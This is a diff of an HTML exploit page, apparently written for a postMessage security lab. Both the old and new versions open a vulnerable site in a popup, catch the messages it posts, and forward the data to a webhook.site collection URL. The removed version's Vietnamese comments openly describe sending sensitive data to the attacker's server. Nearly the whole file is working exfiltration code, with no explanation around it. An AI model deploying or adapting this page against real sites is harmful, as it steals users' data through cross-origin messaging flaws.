@@ -1,36 +1,31 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Malicious Page</title>
-  <script>
-    function receiveMessage(event) {
-      // Kiểm tra nếu thông điệp đến từ trang bị ảnh hưởng
-      if (event.origin !== 'http://ptl-c1cb5798-5d605bfc.libcurl.so') {
-        return;
-      }
-
-      // Lấy dữ liệu từ thông điệp
-      var data = event.data;
-
-      // Gửi dữ liệu nhạy cảm về server của bạn
-      fetch("https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data=" + encodeURIComponent(data));
-    }
-
-    // Thêm listener để nhận thông điệp
-    window.addEventListener('message', receiveMessage, false);
-
-    // Mở trang bị ảnh hưởng
-    function openVulnerablePage() {
-      var popup = window.open('http://ptl-c1cb5798-5d605bfc.libcurl.so/', 'vulnerablePage', 'width=800,height=600');
-
-      // Đợi cho trang popup tải xong và gửi thông điệp
-      popup.onload = function() {
-        popup.postMessage('Hello from malicious page', 'http://ptl-c1cb5798-5d605bfc.libcurl.so');
-      };
-    }
-  </script>
+    <meta charset="UTF-8">
+    <title>Exploit PostMessage Vulnerability</title>
 </head>
-<body onload="openVulnerablePage()">
-  <h1>Malicious Page</h1>
+<body>
+    <script>
+        // Function to send data to your server
+        function sendToServer(data) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data", true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.send(JSON.stringify(data));
+        }
+
+        // Listen for the message from the vulnerable site
+        window.addEventListener("message", function(event) {
+            // Make sure the message is from the expected origin
+            if (event.origin === "http://ptl-4b6d7b26-f4e36987.libcurl.so") {
+                // Send the received data to your server
+                sendToServer(event.data);
+            }
+        }, false);
+
+        // Open the vulnerable page in a new window
+        var newWindow = window.open("http://ptl-4b6d7b26-f4e36987.libcurl.so/key/0", "ptlabdata0", "height=200,width=150");
+
+    </script>
 </body>
 </html>
